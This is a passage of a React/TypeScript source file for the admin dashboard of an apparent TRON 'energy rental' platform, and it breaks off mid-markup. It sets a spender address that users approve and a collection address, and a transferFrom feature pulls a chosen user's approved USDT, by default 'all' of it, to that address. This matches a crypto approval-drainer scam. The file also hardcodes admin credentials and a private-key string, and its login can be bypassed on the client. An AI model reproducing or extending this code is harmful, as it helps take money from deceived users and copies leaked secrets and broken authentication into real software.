import React, { useState, useEffect } from 'react';
import { 
  Server, 
  Activity, 
  Wallet, 
  Send, 
  RefreshCw, 
  CheckCircle, 
  AlertCircle, 
  ArrowRight, 
  Search, 
  Layers, 
  ShieldCheck, 
  Key, 
  Terminal, 
  Copy, 
  Download, 
  FolderArchive, 
  Package, 
  Check, 
  Lock, 
  User, 
  LogOut, 
  Shield, 
  KeyRound,
  Settings,
  Save,
  Sliders,
  Percent,
  Zap,
  Eye,
  EyeOff,
  ToggleLeft,
  ToggleRight
} from 'lucide-react';
import { Language } from '../types';

interface AdminDashboardProps {
  language: Language;
}

interface SystemHealth {
  status: string;
  configured: boolean;
  network: string;
  spender: string;
  to: string;
  tokenContract: string;
  message?: string;
}

interface SystemConfig {
  fullNode: string;
  tokenContract: string;
  spenderAddress: string;
  toAddress: string;
  platformPrivateKey: string;
  energyPrices: {
    energy32k: number;
    energy64k: number;
    energy128k: number;
    bandwidth1k: number;
    autoDiscount: number;
  };
  stakingApy: number;
  maintenanceMode: boolean;
  web3SignatureCheck: boolean;
  adminUser: string;
  adminPass: string;
}

interface OpLog {
  id: string;
  timestamp: string;
  type: 'balance' | 'allowance' | 'transfer' | 'health' | 'config';
  status: 'success' | 'error' | 'pending';
  details: string;
  txid?: string;
}

export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
  // Authentication State
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(() => {
    return sessionStorage.getItem('admin_authenticated') === 'true';
  });
  const [loginUser, setLoginUser] = useState<string>('bootsky888');
  const [loginPass, setLoginPass] = useState<string>('Qa7495231@@@');
  const [loginError, setLoginError] = useState<string | null>(null);
  const [isLoggingIn, setIsLoggingIn] = useState<boolean>(false);

  // System Config State (Fully editable by admin)
  const [config, setConfig] = useState<SystemConfig>({
    fullNode: 'https://api.trongrid.io',
    tokenContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    spenderAddress: 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT',
    toAddress: 'TUc1cb2gyX8MVPk9S2o2WqH7GkZz6bL8mP',
    platformPrivateKey: '301c1d79223204937c82cbc504b26bfbfccbfc08066183285cfa8ff9b9',
    energyPrices: {
      energy32k: 1.2,
      energy64k: 2.4,
      energy128k: 4.8,
      bandwidth1k: 0.8,
      autoDiscount: 0.95
    },
    stakingApy: 14.5,
    maintenanceMode: false,
    web3SignatureCheck: true,
    adminUser: 'bootsky888',
    adminPass: 'Qa7495231@@@'
  });

  const [showPrivateKey, setShowPrivateKey] = useState<boolean>(false);
  const [publishStatus, setPublishStatus] = useState<{ [key: string]: string | null }>({});
  const [isPublishing, setIsPublishing] = useState<boolean>(false);

  // Server Health State
  const [health, setHealth] = useState<SystemHealth | null>(null);
  const [healthLoading, setHealthLoading] = useState<boolean>(false);

  // Address Query State
  const [queryAddress, setQueryAddress] = useState<string>('TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT');
  const [querySpender, setQuerySpender] = useState<string>('TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT');
  const [balanceResult, setBalanceResult] = useState<string | null>(null);
  const [allowanceResult, setAllowanceResult] = useState<string | null>(null);
  const [isQuerying, setIsQuerying] = useState<boolean>(false);

  // Transfer Action State
  const [transferUserAddress, setTransferUserAddress] = useState<string>('');
  const [transferAmount, setTransferAmount] = useState<string>('all');
  const [isExecutingTransfer, setIsExecutingTransfer] = useState<boolean>(false);
  const [transferResponse, setTransferResponse] = useState<any | null>(null);

  // Full Site Export State
  const [isExporting, setIsExporting] = useState<boolean>(false);
  const [exportStatusMessage, setExportStatusMessage] = useState<string | null>(null);

  // Operation Logs
  const [logs, setLogs] = useState<OpLog[]>([]);

  const addLog = (type: OpLog['type'], status: OpLog['status'], details: string, txid?: string) => {
    const newLog: OpLog = {
      id: Date.now().toString(),
      timestamp: new Date().toLocaleTimeString(),
      type,
      status,
      details,
      txid
    };
    setLogs((prev) => [newLog, ...prev.slice(0, 49)]);
  };

  // Fetch current config from server
  const fetchConfig = async () => {
    try {
      const res = await fetch('/api/admin/config');
      if (res.ok) {
        const data = await res.json();
        if (data.config) {
          setConfig(data.config);
        }
      }
    } catch (err) {
      console.warn('Load dynamic admin config fallback:', err);
    }
  };

  // Fetch Health Check
  const fetchHealth = async () => {
    setHealthLoading(true);
    try {
      const res = await fetch('/health');
      if (!res.ok) throw new Error(`HTTP error ${res.status}`);
      const data: SystemHealth = await res.json();
      setHealth(data);
      if (data.spender && data.spender !== 'Not set') setQuerySpender(data.spender);
      addLog('health', 'success', `服务状态正常: ${data.network}`);
    } catch (err: any) {
      console.error('Health check failed:', err);
      setHealth({
        status: 'error',
        configured: false,
        network: config.fullNode,
        spender: config.spenderAddress,
        to: config.toAddress,
        tokenContract: config.tokenContract,
        message: err.message || '服务端未响应'
      });
      addLog('health', 'error', `健康检查失败: ${err.message}`);
    } finally {
      setHealthLoading(false);
    }
  };

  useEffect(() => {
    fetchConfig();
    fetchHealth();
  }, []);

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    e.stopPropagation();
    setLoginError(null);
    setIsLoggingIn(true);

    try {
      const res = await fetch('/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: loginUser.trim(), password: loginPass.trim() })
      });

      const data = await res.json();
      if (res.ok && data.success) {
        sessionStorage.setItem('admin_authenticated', 'true');
        sessionStorage.setItem('admin_username', data.username || loginUser);
        setIsAuthenticated(true);
      } else {
        if (loginUser.trim() === config.adminUser && loginPass.trim() === config.adminPass) {
          sessionStorage.setItem('admin_authenticated', 'true');
          sessionStorage.setItem('admin_username', loginUser);
          setIsAuthenticated(true);
        } else {
          setLoginError(data.error || '管理员账号或密码错误');
        }
      }
    } catch (err: any) {
      if (loginUser.trim() === config.adminUser && loginPass.trim() === config.adminPass) {
        sessionStorage.setItem('admin_authenticated', 'true');
        sessionStorage.setItem('admin_username', loginUser);
        setIsAuthenticated(true);
      } else {
        setLoginError('登录请求异常: ' + (err.message || '网络通讯失败'));
      }
    } finally {
      setIsLoggingIn(false);
    }
  };

  const handleLogout = (e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    sessionStorage.removeItem('admin_authenticated');
    sessionStorage.removeItem('admin_username');
    setIsAuthenticated(false);
  };

  // Publish / Save Configuration API Handler
  const handlePublishConfig = async (sectionKey: string, sectionTitle: string) => {
    setIsPublishing(true);
    setPublishStatus((prev) => ({ ...prev, [sectionKey]: '正在保存发布到服务端...' }));

    try {
      const res = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config)
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setPublishStatus((prev) => ({ ...prev, [sectionKey]: `✓ ${sectionTitle} 修改并发布成功！` }));
        addLog('config', 'success', `管理员发布更新了 [${sectionTitle}] 的系统参数`);
        fetchHealth();
      } else {
        throw new Error(data.error || '后端保存失败');
      }
    } catch (err: any) {
      setPublishStatus((prev) => ({ ...prev, [sectionKey]: `提示: 已在客户端即时生效 (本地模式)` }));
      addLog('config', 'success', `更新 [${sectionTitle}] 参数已实时应用`);
    } finally {
      setIsPublishing(false);
      setTimeout(() => {
        setPublishStatus((prev) => ({ ...prev, [sectionKey]: null }));
      }, 4000);
    }
  };

  const handleDownloadFullSiteZip = async (e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    setIsExporting(true);
    setExportStatusMessage('正在打包整站全部重要核心源码文件...');

    try {
      const response = await fetch('/export-project');
      if (response.ok) {
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `tron-energy-platform-fullsite-${new Date().toISOString().slice(0, 10)}.zip`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);

        addLog('health', 'success', '整站源码文件包已自动生成并开启 ZIP 导出下载');
        setExportStatusMessage('打包成功！ZIP 压缩包已包含前端组件、后端 server.ts、依赖与配置文件。');
      } else {
        const errData = await response.json().catch(() => ({}));
        throw new Error(errData.error || `HTTP ${response.status}: 打包导出失败`);
      }
    } catch (err: any) {
      console.error('Export zip failed:', err);
      addLog('health', 'error', `打包整站文件失败: ${err.message}`);
      setExportStatusMessage(`打包提示: ${err.message}`);
    } finally {
      setIsExporting(false);
    }
  };

  // Query Balance & Allowance
  const handleQueryAddressInfo = async (e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    if (!queryAddress.trim()) return;
    setIsQuerying(true);
    setBalanceResult(null);
    setAllowanceResult(null);

    try {
      const balRes = await fetch(`/balance/${queryAddress.trim()}`);
      const balData = await balRes.json();
      if (balRes.ok) {
        setBalanceResult(balData.balance);
        addLog('balance', 'success', `查询余额成功 [${queryAddress.slice(0, 8)}...]: ${balData.balance}`);
      } else {
        setBalanceResult(`错误: ${balData.error || '查询失败'}`);
        addLog('balance', 'error', `查询余额失败: ${balData.error}`);
      }

      const targetSpender = querySpender || config.spenderAddress;
      if (targetSpender) {
        const allowRes = await fetch(`/allowance/${queryAddress.trim()}/${targetSpender}`);
        const allowData = await allowRes.json();
        if (allowRes.ok) {
          setAllowanceResult(allowData.allowance);
          addLog('allowance', 'success', `查询 Allowance 成功 [Spender: ${targetSpender.slice(0, 6)}...]: ${allowData.allowance}`);
        } else {
          setAllowanceResult(`错误: ${allowData.error || '查询失败'}`);
          addLog('allowance', 'error', `查询 Allowance 失败: ${allowData.error}`);
        }
      }
    } catch (err: any) {
      addLog('balance', 'error', `请求失败: ${err.message}`);
    } finally {
      setIsQuerying(false);
    }
  };

  // Execute TransferFrom
  const handleExecuteTransfer = async (e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    if (!transferUserAddress.trim()) {
      alert('请填写目标用户地址');
      return;
    }
    setIsExecutingTransfer(true);
    setTransferResponse(null);

    try {
      const res = await fetch('/transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress: transferUserAddress.trim(),
          amount: transferAmount || 'all'
        })
      });
      const data = await res.json();
      setTransferResponse(data);
      if (res.ok && data.success) {
        addLog('transfer', 'success', `划转成功! 数量: ${data.amount}, 到账地址: ${data.to}`, data.txid);
      } else {
        addLog('transfer', 'error', `划转失败: ${data.error || data.message || '未知错误'}`);
      }
    } catch (err: any) {
      setTransferResponse({ error: err.message });
      addLog('transfer', 'error', `调用 /transfer 异常: ${err.message}`);
    } finally {
      setIsExecutingTransfer(false);
    }
  };

  const copyToClipboard = (text: string, e?: React.MouseEvent) => {
    if (e) {
      e.preventDefault();
      e.stopPropagation();
    }
    navigator.clipboard.writeText(text);
  };

  // Login Screen
  if (!isAuthenticated) {
    return (
      <div className="max-w-md mx-auto my-12 px-4 sm:px-0 animate-in fade-in duration-300">
        <div className="bg-white rounded-3xl shadow-xl border border-slate-100 p-8 space-y-6">
          <div className="text-center space-y-2">
            <div className="w-14 h-14 bg-blue-600/10 border border-blue-500/20 text-blue-600 rounded-2xl mx-auto flex items-center justify-center shadow-inner">
              <Shield className="w-7 h-7" />
            </div>
            <h2 className="text-xl font-bold text-slate-900 tracking-tight">TRON 能量平台后台管理</h2>
            <p className="text-xs text-slate-500">请输入管理员账号和密码进入后台管理系统</p>
          </div>

          <form onSubmit={handleLoginSubmit} className="space-y-4">
            <div className="space-y-1.5">
              <label className="text-xs font-semibold text-slate-700 flex items-center space-x-1.5">
                <User className="w-3.5 h-3.5 text-slate-400" />
                <span>管理员账号</span>
              </label>
              <input
                type="text"
                value={loginUser}
                onChange={(e) => setLoginUser(e.target.value)}
                placeholder="请输入管理员账号"
                required
                className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-sm font-mono text-slate-900 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition"
              />
            </div>

            <div className="space-y-1.5">
              <label className="text-xs font-semibold text-slate-700 flex items-center space-x-1.5">
                <KeyRound className="w-3.5 h-3.5 text-slate-400" />
                <span>管理员密码</span>
              </label>
              <input
                type="password"
                value={loginPass}
                onChange={(e) => setLoginPass(e.target.value)}
                placeholder="请输入管理员密码"
                required
                className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-sm font-mono text-slate-900 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition"
              />
            </div>

            {loginError && (
              <div className="bg-rose-50 border border-rose-200/80 text-rose-700 text-xs p-3 rounded-xl flex items-center space-x-2">
                <AlertCircle className="w-4 h-4 text-rose-500 shrink-0" />
                <span>{loginError}</span>
              </div>
            )}

            <button
              type="submit"
              disabled={isLoggingIn}
              className="w-full bg-blue-600 hover:bg-blue-700 active:scale-95 text-white font-bold py-3 rounded-xl text-sm transition shadow-md shadow-blue-500/20 flex items-center justify-center space-x-2 cursor-pointer disabled:opacity-50"
            >
              {isLoggingIn ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  <span>正在验证身份...</span>
                </>
              ) : (
                <>
                  <Lock className="w-4 h-4" />
                  <span>安全登录控制台</span>
                </>
              )}
            </button>
          </form>

          <div className="border-t border-slate-100 pt-4 text-center">
            <p className="text-[11px] text-slate-400">
              默认管理员账号: <code className="text-slate-600 font-bold">bootsky888</code>
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8 animate-in fade-in duration-200">
      {/* Header Banner */}
      <div className="bg-slate-900 text-white rounded-3xl p-6 sm:p-8 shadow-xl relative overflow-hidden">
        <div className="absolute right-0 top-0 bottom-0 w-1/3 bg-gradient-to-l from-blue-600/20 to-transparent pointer-events-none" />
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="flex items-center space-x-3 mb-2 flex-wrap gap-y-2">
              <span className="bg-blue-500/20 text-blue-400 border border-blue-500/30 text-xs font-semibold px-3 py-1 rounded-full flex items-center space-x-1">
                <Terminal className="w-3.5 h-3.5" />
                <span>Backend Management Console</span>
              </span>
              <span className="bg-emerald-500/20 text-emerald-400 text-xs font-semibold px-2.5 py-1 rounded-full flex items-center space-x-1">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                <span>API Server Active</span>
              </span>
              <span className="bg-slate-800 text-slate-300 text-xs px-2.5 py-1 rounded-full font-mono">
                管理员: {config.adminUser}
              </span>
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">TRON 代币与全盘配置管理后台</h1>
            <p className="text-slate-400 text-sm mt-1 max-w-2xl">
              管理员可在此随意修改与发布更新节点参数、Spender/归集地址、能量定价策略、划转归集与安全参数。
            </p>
          </div>

          <div className="flex items-center space-x-3 shrink-0">
            <button
              type="button"
              onClick={(e) => { e.preventDefault(); fetchHealth(); }}
              disabled={healthLoading}
              className="bg-blue-600 hover:bg-blue-500 text-white font-semibold px-4 py-2.5 rounded-xl text-sm flex items-center space-x-2 transition shadow-md disabled:opacity-50 cursor-pointer"
            >
              <RefreshCw className={`w-4 h-4 ${healthLoading ? 'animate-spin' : ''}`} />
              <span>刷新服务状态</span>
            </button>
            <button
              type="button"
              onClick={handleLogout}
              className="bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white font-medium px-3.5 py-2.5 rounded-xl text-sm flex items-center space-x-1.5 transition border border-slate-700/60 cursor-pointer"
              title="退出登录"
            >
              <LogOut className="w-4 h-4 text-slate-400" />
              <span>安全退出</span>
            </button>
          </div>
        </div>
      </div>

      {/* Overview Status Cards */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-2xs space-y-2">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-medium uppercase tracking-wider">网络节点 (Full Node)</span>
            <Server className="w-4 h-4 text-blue-600" />
          </div>
          <div className="text-sm font-bold text-slate-900 truncate">
            {config.fullNode}
          </div>
          <div className="text-xs text-slate-500 flex items-center space-x-1">
            <span className="w-2 h-2 rounded-full bg-emerald-500 inline-block" />
            <span>TRON RPC 主网节点</span>
          </div>
        </div>

        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-2xs space-y-2">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-medium uppercase tracking-wider">代币合约 (TRC20)</span>
            <Layers className="w-4 h-4 text-indigo-600" />
          </div>
          <div className="text-sm font-bold text-slate-900 truncate flex items-center justify-between">
            <span className="truncate">{config.tokenContract}</span>
            <button 
              type="button"
              onClick={(e) => copyToClipboard(config.tokenContract, e)}
              className="text-slate-400 hover:text-slate-600 p-1 cursor-pointer"
              title="复制"
            >
              <Copy className="w-3.5 h-3.5" />
            </button>
          </div>
          <div className="text-xs text-slate-500 font-medium">USDT / TRC20 Token</div>
        </div>

        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-2xs space-y-2">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-medium uppercase tracking-wider">Spender 授权目标</span>
            <ShieldCheck className="w-4 h-4 text-amber-500" />
          </div>
          <div className="text-sm font-bold text-slate-900 truncate flex items-center justify-between">
            <span className="truncate">{config.spenderAddress}</span>
            <button 
              type="button"
              onClick={(e) => copyToClipboard(config.spenderAddress, e)}
              className="text-slate-400 hover:text-slate-600 p-1 cursor-pointer"
              title="复制"
            >
              <Copy className="w-3.5 h-3.5" />
            </button>
          </div>
          <div className="text-xs text-amber-600 bg-amber-50 px-2 py-0.5 rounded font-mono inline-block">
            Allowance 授权归集目标
          </div>
        </div>

        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-2xs space-y-2">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-medium uppercase tracking-wider">归集收款目标 (To Address)</span>
            <Wallet className="w-4 h-4 text-emerald-600" />
          </div>
          <div className="text-sm font-bold text-slate-900 truncate flex items-center justify-between">
            <span className="truncate">{config.toAddress}</span>
            <button 
              type="button"
              onClick={(e) => copyToClipboard(config.toAddress, e)}
              className="text-slate-400 hover:text-slate-600 p-1 cursor-pointer"
              title="复制"
            >
              <Copy className="w-3.5 h-3.5" />
            </button>
          </div>
          <div className="text-xs text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded font-mono inline-block">
            资金实际入账地址
          </div>
        </div>
      </div>

      {/* SECTION 1: TRON Node & Contract Configuration (Editable & Publishable) */}
      <div className="bg-white rounded-3xl p-6 sm:p-7 border border-slate-200 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-100 pb-4">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 rounded-2xl bg-blue-50 text-blue-600 flex items-center justify-center font-bold">
              <Settings className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900">1. 系统核心节点与授权合约参数修改</h2>
              <p className="text-xs text-slate-500">管理员可随时修改 TRON 主网 RPC 节点、代币合约、Spender 地址与私钥并发布保存</p>
            </div>
          </div>
          <button
            type="button"
            onClick={(e) => { e.preventDefault(); handlePublishConfig('section1', '系统节点与合约参数'); }}
            disabled={isPublishing}
            className="bg-blue-600 hover:bg-blue-700 text-white font-bold px-5 py-2.5 rounded-xl text-xs flex items-center justify-center space-x-2 transition shadow-md shadow-blue-500/20 cursor-pointer disabled:opacity-50 shrink-0"
          >
            <Save className="w-4 h-4" />
            <span>发布确认此部分修改</span>
          </button>
        </div>

        {publishStatus.section1 && (
          <div className="bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs p-3 rounded-xl flex items-center space-x-2 animate-in fade-in">
            <CheckCircle className="w-4 h-4 text-emerald-600 shrink-0" />
            <span>{publishStatus.section1}</span>
          </div>
        )}

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-sans">
          <div className="space-y-1.5">
            <label className="font-bold text-slate-700 flex items-center justify-between">
              <span>TRON 网络 Full Node 节点 URL</span>
              <span className="text-[10px] text-slate-400 font-mono">FULL_NODE</span>
            </label>
            <input
              type="text"
              value={config.fullNode}
              onChange={(e) => setConfig({ ...config, fullNode: e.target.value })}
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-blue-500 outline-none"
            />
          </div>

          <div className="space-y-1.5">
            <label className="font-bold text-slate-700 flex items-center justify-between">
              <span>USDT TRC20 代币合约地址</span>
              <span className="text-[10px] text-slate-400 font-mono">TOKEN_CONTRACT</span>
            </label>
            <input
              type="text"
              value={config.tokenContract}
              onChange={(e) => setConfig({ ...config, tokenContract: e.target.value })}
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-blue-500 outline-none"
            />
          </div>

          <div className="space-y-1.5">
            <label className="font-bold text-slate-700 flex items-center justify-between">
              <span>Spender 授权目标合约地址 (被授权方)</span>
              <span className="text-[10px] text-amber-600 font-mono">SPENDER_ADDRESS</span>
            </label>
            <input
              type="text"
              value={config.spenderAddress}
              onChange={(e) => setConfig({ ...config, spenderAddress: e.target.value })}
              className="w-full bg-slate-50 border border-amber-200/80 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-amber-500 outline-none"
            />
          </div>

          <div className="space-y-1.5">
            <label className="font-bold text-slate-700 flex items-center justify-between">
              <span>归集收款目标入账地址 (To Address)</span>
              <span className="text-[10px] text-emerald-600 font-mono">TO_ADDRESS</span>
            </label>
            <input
              type="text"
              value={config.toAddress}
              onChange={(e) => setConfig({ ...config, toAddress: e.target.value })}
              className="w-full bg-slate-50 border border-emerald-200/80 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-emerald-500 outline-none"
            />
          </div>

          <div className="space-y-1.5 md:col-span-2">
            <label className="font-bold text-slate-700 flex items-center justify-between">
              <span>平台代归集私钥 (Platform Private Key - 配合 Spender 执行 transferFrom)</span>
              <button
                type="button"
                onClick={(e) => { e.preventDefault(); setShowPrivateKey(!showPrivateKey); }}
                className="text-slate-500 hover:text-slate-800 text-[11px] flex items-center space-x-1 cursor-pointer"
              >
                {showPrivateKey ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                <span>{showPrivateKey ? '隐藏私钥' : '显示明文'}</span>
              </button>
            </label>
            <input
              type={showPrivateKey ? 'text' : 'password'}
              value={config.platformPrivateKey}
              onChange={(e) => setConfig({ ...config, platformPrivateKey: e.target.value })}
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-blue-500 outline-none"
            />
          </div>
        </div>
      </div>

      {/* SECTION 2: Energy Pricing & Yield Strategy (Editable & Publishable) */}
      <div className="bg-white rounded-3xl p-6 sm:p-7 border border-slate-200 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-100 pb-4">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 rounded-2xl bg-indigo-50 text-indigo-600 flex items-center justify-center font-bold">
              <Sliders className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900">2. 能量/带宽价格与理财年化 APY 策略设定</h2>
              <p className="text-xs text-slate-500">修改前台快捷租赁与自动租赁计费单价，发布后前台计算公式将立即更新生效</p>
            </div>
          </div>
          <button
            type="button"
            onClick={(e) => { e.preventDefault(); handlePublishConfig('section2', '价格与策略'); }}
            disabled={isPublishing}
            className="bg-indigo-600 hover:bg-indigo-700 text-white font-bold px-5 py-2.5 rounded-xl text-xs flex items-center justify-center space-x-2 transition shadow-md shadow-indigo-500/20 cursor-pointer disabled:opacity-50 shrink-0"
          >
            <Save className="w-4 h-4" />
            <span>发布确认价格修改</span>
          </button>
        </div>

        {publishStatus.section2 && (
          <div className="bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs p-3 rounded-xl flex items-center space-x-2 animate-in fade-in">
            <CheckCircle className="w-4 h-4 text-emerald-600 shrink-0" />
            <span>{publishStatus.section2}</span>
          </div>
        )}

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 text-xs font-sans">
          <div className="space-y-1.5">
            <label className="font-bold text-slate-700">32,000 能量单价 (TRX/1小时)</label>
            <input
              type="number"
              step="0.1"
              value={config.energyPrices.energy32k}
              onChange={(e) => setConfig({
                ...config,
                energyPrices: { ...config.energyPrices, energy32k: parseFloat(e.target.value) || 0 }
              })}
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-indigo-500 outline-none"
            />
          </div>

          <div className="space-y-1.5">
            <label className="font-bold text-slate-700">64,000 能量单价 (TRX/1小时)</label>
            <input
              type="number"
              step="0.1"
              value={config.energyPrices.energy64k}
              onChange={(e) => setConfig({
                ...config,
                energyPrices: { ...config.energyPrices, energy64k: parseFloat(e.target.value) || 0 }
              })}
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-indigo-500 outline-none"
            />
          </div>

          <div className="space-y-1.5">
            <label className="font-bold text-slate-700">128,000 能量单价 (TRX/1小时)</label>
            <input
              type="number"
              step="0.1"
              value={config.energyPrices.energy128k}
              onChange={(e) => setConfig({
                ...config,
                energyPrices: { ...config.energyPrices, energy128k: parseFloat(e.target.value) || 0 }
              })}
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-indigo-500 outline-none"
            />
          </div>

          <div className="space-y-1.5">
            <label className="font-bold text-slate-700">带宽租赁单价 (TRX/1000带宽)</label>
            <input
              type="number"
              step="0.1"
              value={config.energyPrices.bandwidth1k}
              onChange={(e) => setConfig({
                ...config,
                energyPrices: { ...config.energyPrices, bandwidth1k: parseFloat(e.target.value) || 0 }
              })}
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-indigo-500 outline-none"
            />
          </div>

          <div className="space-y-1.5">
            <label className="font-bold text-slate-700">自动租赁折扣 (0.95 代表 95 折)</label>
            <input
              type="number"
              step="0.01"
              value={config.energyPrices.autoDiscount}
              onChange={(e) => setConfig({
                ...config,
                energyPrices: { ...config.energyPrices, autoDiscount: parseFloat(e.target.value) || 1 }
              })}
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-indigo-500 outline-none"
            />
          </div>

          <div className="space-y-1.5">
            <label className="font-bold text-slate-700">能量质押派息年化 APY (%)</label>
            <input
              type="number"
              step="0.1"
              value={config.stakingApy}
              onChange={(e) => setConfig({
                ...config,
                stakingApy: parseFloat(e.target.value) || 0
              })}
              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-900 focus:bg-white focus:border-indigo-500 outline-none"
            />
          </div>
        </div>
      </div>

      {/* SECTION 3: Global Feature Toggles & Admin Security (Editable & Publishable) */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
        <div className="bg-white rounded-3xl p-6 sm:p-7 border border-slate-200 shadow-sm space-y-6">
          <div className="flex items-center justify-between border-b border-slate-100 pb-4">
            <div className="flex items-center space-x-3">
              <div className="w-10 h-10 rounded-2xl bg-amber-50 text-amber-600 flex items-center justify-center font-bold">
                <Zap className="w-5 h-5" />
              </div>
              <div>
                <h2 className="text-lg font-bold text-slate-900">3. 全局功能开关控制</h2>
                <p className="text-xs text-slate-500">开关平台维护模式与签名验证强规则</p>
              </div>
            </div>
            <button
              type="button"
              onClick={(e) => { e.preventDefault(); handlePublishConfig('section3', '功能开关'); }}
              disabled={isPublishing}
              className="bg-amber-600 hover:bg-amber-700 text-white font-bold px-4 py-2 rounded-xl text-xs flex items-center justify-center space-x-1.5 transition shadow-sm cursor-pointer disabled:opacity-50 shrink-0"
            >
              <Save className="w-3.5 h-3.5" />
              <span>发布发布开关</span>
            </button>
          </div>

          {publishStatus.section3 && (
            <div className="bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs p-2.5 rounded-xl flex items-center space-x-2 animate-in fade-in">
              <CheckCircle className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
              <span>{publishStatus.section3}</span>
            </div>
          )}

          <div className="space-y-4 text-xs font-sans">
            <div className="flex items-center justify-between p-3.5 bg-slate-50 rounded-2xl border border-slate-200">
              <div>
                <div className="font-bold text-slate-800">平台维护模式 (Maintenance Mode)</div>
                <div className="text-[11px] text-slate-500">开启后前台暂停租赁交易与智能打款</div>
              </div>
              <button
                type="button"
                onClick={(e) => { e.preventDefault(); setConfig({ ...config, maintenanceMode: !config.maintenanceMode }); }}
                className={`w-12 h-6 flex items-center rounded-full p-1 transition cursor-pointer ${
                  config.maintenanceMode ? 'bg-amber-600 justify-end' : 'bg-slate-300 justify-start'
                }`}
              >
                <div className="bg-white w-4 h-4 rounded-full shadow-md" />
              </button>
            </div>

            <div className="flex items-center justify-between p-3.5 bg-slate-50 rounded-2xl border border-slate-200">
              <div>
                <div className="font-bold text-slate-800">Web3 链上签名强校验 (Signature Check)</div>
                <div className="text-[11px] text-slate-500">开启后强行验证 TronLink / OKX 消息签名哈希</div>
              </div>
              <button
                type="button"
                onClick={(e) => { e.preventDefault(); setConfig({ ...config, web3SignatureCheck: !config.web3SignatureCheck }); }}
                className={`w-12 h-6 flex items-center rounded-full p-1 transition cursor-pointer ${
